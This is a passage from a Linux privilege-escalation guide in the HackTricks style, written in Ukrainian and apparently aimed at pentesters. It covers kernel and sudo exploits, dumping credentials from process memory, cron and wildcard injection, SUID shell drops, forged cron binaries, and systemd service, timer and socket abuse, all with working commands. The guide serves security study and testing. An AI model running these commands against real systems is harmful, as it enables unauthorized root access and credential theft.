# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **have write permissions on any folder inside the `PATH`** змінної, ви можете зуміти hijack деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про середовище

Чи є в змінних середовища цікава інформація, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel та наявність exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії kernel з того сайту, можна зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити НА victim, перевіряє лише exploits для kernel 2.x)

Завжди **пошукайте версію ядра в Google**, можливо ваша версія ядра згадується в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють непривілейованим локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з директорії, якою керує користувач.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойту переконайтеся, що ваша версія `sudo` вразлива і що вона підтримує функцію `chroot`.

Для отримання додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не вдалася

Перегляньте **smasher2 box of HTB** для **прикладу** того, як цей vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Детальніше перерахування системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Якщо ви всередині container, почніть із наступного розділу container-security, а потім перейдіть до сторінок runtime-specific abuse:

{{#ref}}
container-security/
{{#endref}}

## Диски

Перевірте, **що саме змонтовано та не змонтовано**, де і навіщо. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перерахуйте корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлений **якийсь компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, встановлена стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендується вручну перевірити версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки, чи встановлене в системі застаріле або вразливе програмне забезпечення.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде марною; тому рекомендовано використовувати такі програми, як OpenVAS або подібні, які перевірять, чи якась версія встановленого програмного забезпечення вразлива до відомих exploits_

## Processes

Перегляньте, які **процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо tomcat виконується від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевіряйте свої привілеї над бінарними файлами процесів**, можливо, ви зможете перезаписати якийсь.

### Process monitoring

Ви можете використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, що запускаються часто або коли виконуються певні умови.

### Process memory

Деякі сервіси на сервері зберігають **credentials у відкритому вигляді в пам'яті**.\
Зазвичай для читання пам'яті процесів інших користувачів потрібні **root-привілеї**, тому це зазвичай корисніше, коли ви вже root і хочете знайти додаткові credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, що належать вам**.

> [!WARNING]
> Зверніть увагу, що сьогодні більшість машин **не дозволяють ptrace за замовчуванням**, що означає, що ви не можете дампити інші процеси, що належать непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Це класичний спосіб, як працювало ptracing.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged. Лише батьківський процес можна відладити.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability. Тільки адміністратор може використовувати ptrace, оскільки це вимагає права CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again. Жоден процес не може бути трасований за допомогою ptrace. Після встановлення потрібно перезавантаження, щоб знову дозволити ptracing.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого PID процесу, **maps показують, як пам'ять розміщується в його** віртуальному адресному просторі; також вони показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **ділянки пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **переміститись у файлі mem і зберегти всі ділянки, доступні для читання, у файл**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. Віртуальному адресному простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний лише для читання користувачеві **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump — це версія ProcDump для Linux, яка переосмислює класичний інструмент із пакету Sysinternals для Windows. Отримати його: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і зробити дамп процесу, що належить вам
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Приклад вручну

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете зробити дамп процесу (див. попередні розділи, щоб знайти різні способи дампування пам'яті процесу) і шукати облікові дані в пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Для коректної роботи потрібні привілеї root.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошук Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) працює під root і прив'язана лише до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити privileged job для privesc.

Типовий ланцюжок
- Виявити loopback-only порт (e.g., 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти credentials в операційних артефактах:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Пробросити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і виконати негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Посилення захисту
- Не запускайте Crontab UI від root; обмежте його окремим користувачем з мінімальними правами
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно passwords
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть audit/logging для on-demand job executions



Перевірте, чи будь-який scheduled job уразливий. Можливо, ви можете скористатися скриптом, який виконується від імені root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях cron

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису до /home/user_)

Якщо всередині цього crontab root намагається виконати якусь команду або скрипт без налаштування PATH. Наприклад: _\* \* \* \* root overwrite.sh_\

Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт виконується від root і має “**\***” усередині команди, ви можете це використати, щоб викликати непередбачувані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, наприклад** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є вразливим).**

Прочитайте наступну сторінку для інших трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter/variable expansion і command substitution перед arithmetic evaluation в ((...)), $((...)) та let. Якщо root cron/parser читає untrusted log fields і підставляє їх у арифметичний контекст, зловмисник може інжектити command substitution $(...), який виконається як root при запуску cron.

- Чому це працює: У Bash expansions відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення типу `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи команду), а залишкове числове `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Домогіться запису attacker-controlled тексту у лог, який парситься, так щоб поле, що виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтесь, що ваша команда не пише в stdout (або перенаправте вивід), щоб арифметика залишалась валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете модифікувати cron script**, який виконується як root, ви можете дуже легко отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, що виконується під root, використовує **каталог, до якого ви маєте повний доступ**, можливо, корисно видалити цю папку і **створити symlink-папку, що вказує на інший каталог**, який обслуговує скрипт, контрольований вами.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink: перевірка та безпечніше оброблення файлів

When reviewing privileged scripts/binaries that read or write files by path, verify how links are handled:

- `stat()` слідує за symlink і повертає метадані цільового файлу.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` and `namei -l` допомагають визначити остаточну ціль і показують права доступу кожного компоненту шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для захисників/розробників, більш безпечні підходи проти symlink трюків включають:

- `O_EXCL` with `O_CREAT`: відмовитись, якщо шлях уже існує (блокує попередньо створені атакуючим links/files).
- `openat()`: виконувати операції відносно довіреного файлового дескриптора директорії.
- `mkstemp()`: створює тимчасові файли атомарно з безпечними правами доступу.

### Користувацьки підписані cron-бінарники з записуваними payloads
Blue teams іноді "підписують" cron-керовані бінарники, дампуючи кастомний ELF-розділ і виконуючи grep на рядок виробника перед тим, як запускати їх як root. Якщо цей бінарник має group-writable (наприклад, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) і ви можете leak the signing material, ви можете підробити розділ і захопити завдання cron:

1. Використайте `pspy` для перехоплення потоку верифікації. В Era root запускав `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, далі `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і потім виконував файл.
2. Відтворіть очікуваний сертифікат, використовуючи the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Зберіть шкідливу заміну (наприклад, встановіть SUID bash, додайте ваш SSH key) і вбудуйте сертифікат у `.text_sig`, щоб grep пройшов:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований бінарник, зберігаючи біти виконання:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного запуску cron; як тільки наївна перевірка підпису пройде, ваш payload запуститься як root.

### Часті cron-завдання

Ви можете моніторити процеси, щоб знайти ті, що виконуються кожні 1, 2 або 5 хвилин. Можливо, це можна використати для ескалації привілеїв.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** і видаляти команди, які виконувалися найчастіше, можна зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежує і перелічує всі процеси, що запускаються).

### Резервні копії root, які зберігають біти режиму, встановлені зловмисником (pg_basebackup)

Якщо cron, що належить root, виконує `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, у який ви маєте право запису, ви можете розмістити **SUID/SGID binary**, який буде перекопійований як **root:root** зі збереженням тих самих бітів режиму у вихідні файли резервної копії.

Типовий сценарій виявлення (як користувач БД з низькими правами):
- Використовуйте `pspy`, щоб помітити cron від root, який викликає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` кожну хвилину.
- Підтвердьте, що вихідний кластер (наприклад, `/var/lib/postgresql/14/main`) доступний для запису вами, і що ціль (`/opt/backups/current`) стає власністю root після виконання завдання.

Експлойт:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Це працює, оскільки `pg_basebackup` зберігає біти режиму файлів при копіюванні кластера; коли його викликає root цільові файли успадковують **root ownership + attacker-chosen SUID/SGID**. Будь-який подібний привілейований механізм резервного копіювання/копіювання, який зберігає права й записує в виконуване розташування, уразливий.

### Невидимі cron jobs

Можна створити cronjob **поставивши carriage return після коментаря** (без newline character), і cron job працюватиме. Приклад (зверніть увагу на символ carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_ доступні для запису

Перевірте, чи можете ви записати будь-який файл `.service`; якщо так, ви **можете змінити його**, щоб він **запускав** ваш **backdoor коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться чекати, поки машина не перезавантажиться).\
Наприклад створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **дозвіл на запис для бінарних файлів, які виконуються сервісами**, ви можете змінити їх на backdoors, тож коли сервіси будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Relative Paths

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** у будь-яку з папок цього шляху, можливо, ви зможете **підвищити привілеї**. Вам потрібно шукати **відносні шляхи, які використовуються в конфігураційних файлах сервісів**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тією ж назвою, що і відносний шлях до бінарника** всередині папки PATH systemd, у яку ви маєте право запису, і коли службі буде наказано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Timers**

**Timers** — це systemd unit файли, назва яких закінчується на `**.timer**`, які керують `**.service**` файлами або подіями. **Timers** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку календарних подій і монотонних часових подій, а також можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі об'єкти systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти systemd unit, який **виконує відносний шлях**, і над яким ви маєте **права на запис** у **systemd PATH** (щоб видавати себе за цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні root privileges і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **timer** **активується** шляхом створення символічного посилання на нього у `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **взаємодію процесів** на одній або різних машинах у клієнт-серверних моделях. Вони використовують стандартні Unix файли дескрипторів для міжкомп'ютерної комунікації і налаштовуються через `.socket` файли.

Sockets can be configured using `.socket` files.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різні, але узагальнення використовується, щоб **вказати, де буде відбуватися прослуховування** сокета (шлях до AF_UNIX socket файлу, IPv4/6 і/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється окрема інстанція сервісу і лише сокет цього з'єднання передається їй. Якщо **false**, усі слухаючі сокети самі **передаються запущеному service unit**, і створюється лише один service unit для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони таким чином, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або більше командних рядків, які **виконуються перед** або **після** створення і прив'язки слухаючих **sockets**/FIFO відповідно. Перший токен командного рядка має бути абсолютним шляхом до файлу, далі слідують аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** закриття та видалення слухаючих **sockets**/FIFO відповідно.
- `Service`: Вказує назву **service** unit-а, який потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена тільки для сокетів з Accept=no. За замовчуванням використовується сервіс з тією ж назвою, що й сокет (з заміненим суфіксом). У більшості випадків використання цієї опції не є необхідним.

### Доступні для запису `.socket` файли

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому **ймовірно доведеться почекати до перезавантаження машини.**\
_Зверніть увагу, що система має використовувати цю конфігурацію `.socket` файлу, інакше backdoor не буде виконано_

### Активація сокета + доступний для запису шлях unit (створення відсутнього сервісу)

Ще одна серйозна неправильна конфігурація:

- socket unit з `Accept=no` і `Service=<name>.service`
- згаданий service unit відсутній
- атакуючий може записувати у `/etc/systemd/system` (або інший шлях пошуку unit-ів)

У такому випадку атакуючий може створити `<name>.service`, потім спричинити трафік до сокета, щоб systemd завантажив і виконав новий сервіс від імені root.

Короткий сценарій:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Якщо ви **виявите будь-який writable socket** (_зараз йдеться про Unix Sockets і не про конфігураційні `.socket` файли_), то **можете взаємодіяти** з цим socket і, можливо, експлуатувати вразливість.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets listening for HTTP** запити (_я не маю на увазі .socket files, а файли, які виконують роль unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **exploit some vulnerability**.

### Docker сокет з правом запису

